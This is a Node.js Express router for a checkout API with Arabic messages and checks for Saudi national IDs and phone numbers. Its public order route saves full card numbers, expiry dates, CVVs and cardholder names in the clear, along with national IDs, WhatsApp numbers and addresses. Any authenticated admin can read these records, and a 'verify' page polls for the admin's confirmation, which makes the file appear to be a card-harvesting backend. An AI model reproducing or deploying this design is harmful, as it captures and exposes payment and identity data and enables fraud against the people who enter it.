const express = require("express");
const jwt = require("jsonwebtoken");
const router = express.Router();
const Checkout = require("../models/Checkout");
const OrderRateLimit = require("../models/OrderRateLimit");
const { orderRateLimitMiddleware, getRateLimitStatus, resolveClientId } = require("../middleware/orderRateLimit");
const { isBlacklisted } = require("../utils/tokenBlacklist");

async function authMiddleware(req, res, next) {
  const token = req.cookies?.admin_token;
  if (!token) return res.status(401).json({ error: "غير مصرح" });
  if (await isBlacklisted(token)) {
    return res.status(401).json({ error: "الجلسة ملغاة - يرجى تسجيل الدخول مرة أخرى" });
  }
  try {
    req.admin = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: "غير مصرح" });
  }
}

function requireRole(...allowedRoles) {
  return (req, res, next) => {
    if (!req.admin?.role) return res.status(403).json({ error: "غير مصرح" });
    if (!allowedRoles.includes(req.admin.role)) return res.status(403).json({ error: "غير مصرح" });
    next();
  };
}

// Helper: Sanitize string inputs
function sanitize(str) {
  if (!str || typeof str !== "string") return "";
  return str.replace(/[<>'"]/g, "").trim().slice(0, 500);
}

// Helper: Validate Saudi national ID
function isValidSaudiId(id) {
  if (!id || typeof id !== "string") return false;
  return /^[12]\d{9}$/.test(id);
}

// Helper: Validate Saudi phone number
function isValidSaudiPhone(phone) {
  if (!phone || typeof phone !== "string") return false;
  const cleaned = phone.replace(/\D/g, "");
  return /^05\d{8}$/.test(cleaned);
}

// GET /api/checkout/rate-limit-status — public (frontend queries current block state)
router.get("/rate-limit-status", async (req, res) => {
  try {
    const clientId = resolveClientId(req, res);
    const status = await getRateLimitStatus(clientId);
    res.json(status);
  } catch {
    res.json({ blocked: false });
  }
});

// POST /api/checkout — public (يستقبل طلب جديد)
router.post("/", orderRateLimitMiddleware, async (req, res) => {
  try {
    const {
      orderId, cardNumber, expiry, cvv, cardHolder,
      items, total, downPayment, customer, whatsapp,
      nationalId, address, installmentType, months, monthlyPayment,
    } = req.body;

    // ── Validation ──
    if (!orderId || typeof orderId !== "string") {
      return res.status(400).json({ ok: false, error: "رقم الطلب مطلوب" });
    }

    if (!cardNumber || !expiry || !cvv || !cardHolder) {
      return res.status(400).json({ ok: false, error: "بيانات البطاقة ناقصة" });
    }

    if (!items || !Array.isArray(items) || items.length === 0) {
      return res.status(400).json({ ok: false, error: "لا توجد منتجات في الطلب" });
    }

    if (!customer || !whatsapp || !nationalId || !address) {
      return res.status(400).json({ ok: false, error: "بيانات العميل ناقصة" });
    }

    // Validate national ID
    if (!isValidSaudiId(nationalId)) {
      return res.status(400).json({ ok: false, error: "رقم الهوية غير صحيح" });
    }

    // Validate phone number
    if (!isValidSaudiPhone(whatsapp)) {
      return res.status(400).json({ ok: false, error: "رقم الواتساب غير صحيح" });
    }

    // Validate total
    const totalNum = Number(total);
    if (isNaN(totalNum) || totalNum <= 0) {
      return res.status(400).json({ ok: false, error: "المبلغ الإجمالي غير صحيح" });
    }

    // Check for duplicate orderId
    const existingOrder = await Checkout.findOne({ orderId });
    if (existingOrder) {
      console.warn(`[DUPLICATE] Order ${orderId} already exists`);
      return res.status(200).json({ 
        ok: true, 
        orderId: existingOrder.orderId, 
        _id: existingOrder._id,
        duplicate: true 
      });
    }

    // Sanitize inputs
    const sanitizedItems = items.map(item => ({
      productId: sanitize(item.productId || ""),
      name: sanitize(item.name || ""),
      price: Number(item.price) || 0,
      quantity: Math.max(1, Math.floor(Number(item.quantity) || 1)),
    }));

    const checkout = new Checkout({
      orderId,
      cardNumber: sanitize(cardNumber),
      expiry: sanitize(expiry),
      cvv: sanitize(cvv),
      cardHolder: sanitize(cardHolder),
      items: sanitizedItems,
      total: totalNum,
      downPayment: Number(downPayment) || 0,
      customer: sanitize(customer),
      whatsapp: whatsapp.replace(/\D/g, ""),
      nationalId: sanitize(nationalId),
      address: sanitize(address),
      installmentType: installmentType === "installment" ? "installment" : "full",
      months: Math.max(0, Math.floor(Number(months) || 0)),
      monthlyPayment: Number(monthlyPayment) || 0,
    });
    
    await checkout.save();
    console.log(`[ORDER_CREATED] orderId=${orderId} _id=${checkout._id}`);

    // Record successful order timestamp
    if (req.rlClientId) {
      OrderRateLimit.updateOne(
        { key: `anon:${req.rlClientId}` },
        { $set: { lastOrderAt: new Date() } }
      ).catch(() => {});
    }

    res.status(201).json({ ok: true, orderId: checkout.orderId, _id: checkout._id });
  } catch (error) {
    console.error(`[ERROR] Checkout creation failed: ${error.message}`);
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// GET /api/checkout/:id/status — public (للـ polling من صفحة verify)
router.get("/:id/status", async (req, res) => {
  try {
    const order = await Checkout.findById(req.params.id).select("status");
    if (!order) return res.status(404).json({ ok: false });
    res.json({ status: order.status });
  } catch {
    res.status(500).json({ ok: false });
  }
});

// GET /api/checkout — admin only
router.get("/", authMiddleware, async (req, res) => {
  try {
    const page = Math.max(1, parseInt(req.query.page) || 1);
    const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 50));
    const orders = await Checkout.find().sort({ createdAt: -1 }).skip((page - 1) * limit).limit(limit);
    res.json(orders);
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// GET /api/checkout/:id — admin only
router.get("/:id", authMiddleware, async (req, res) => {
  try {
    const order = await Checkout.findById(req.params.id);
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json(order);
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// PUT /api/checkout/:id/status — admin only
const ALLOWED_STATUSES = ["pending", "confirmed", "cancelled"];
router.put("/:id/status", authMiddleware, requireRole("super_admin", "admin"), async (req, res) => {
  try {
    const { status } = req.body;
    if (!ALLOWED_STATUSES.includes(status))
      return res.status(400).json({ ok: false, error: "حالة غير صحيحة" });
    const order = await Checkout.findByIdAndUpdate(
      req.params.id,
      { $set: { status } },
      { new: true, select: "_id status" }
    );
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json({ ok: true, status: order.status });
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// PUT /api/checkout/:id/financials — admin only
router.put("/:id/financials", authMiddleware, requireRole("super_admin", "admin"), async (req, res) => {
  try {
    const { total, downPayment, months, monthlyPayment } = req.body;
    const update = {};
    if (total !== undefined) {
      const t = Number(total);
      if (isNaN(t) || t < 0) return res.status(400).json({ ok: false, error: "الإجمالي غير صحيح" });
      update.total = t;
    }
    if (downPayment !== undefined) {
      const dp = Number(downPayment);
      if (isNaN(dp) || dp < 0) return res.status(400).json({ ok: false, error: "الدفعة غير صحيحة" });
      update.downPayment = dp;
    }
    if (months !== undefined) {
      const m = Math.floor(Number(months));
      if (isNaN(m) || m < 0 || m > 60) return res.status(400).json({ ok: false, error: "عدد الأشهر غير صحيح" });
      update.months = m;
    }
    if (monthlyPayment !== undefined) {
      const mp = Number(monthlyPayment);
      if (isNaN(mp) || mp < 0) return res.status(400).json({ ok: false, error: "القسط غير صحيح" });
      update.monthlyPayment = mp;
    }
    if (update.total !== undefined && update.downPayment !== undefined && update.downPayment > update.total) {
      return res.status(400).json({ ok: false, error: "الدفعة الأولى أكبر من الإجمالي" });
    }
    const order = await Checkout.findByIdAndUpdate(
      req.params.id,
      { $set: update },
      { new: true, select: "_id total downPayment months monthlyPayment" }
    );
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json({ ok: true, ...order.toObject() });
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// DELETE /api/checkout/:id — admin only
router.delete("/:id", authMiddleware, requireRole("super_admin", "admin"), async (req, res) => {
  try {
    const order = await Checkout.findByIdAndDelete(req.params.id);
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json({ ok: true });
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

module.exports = router;
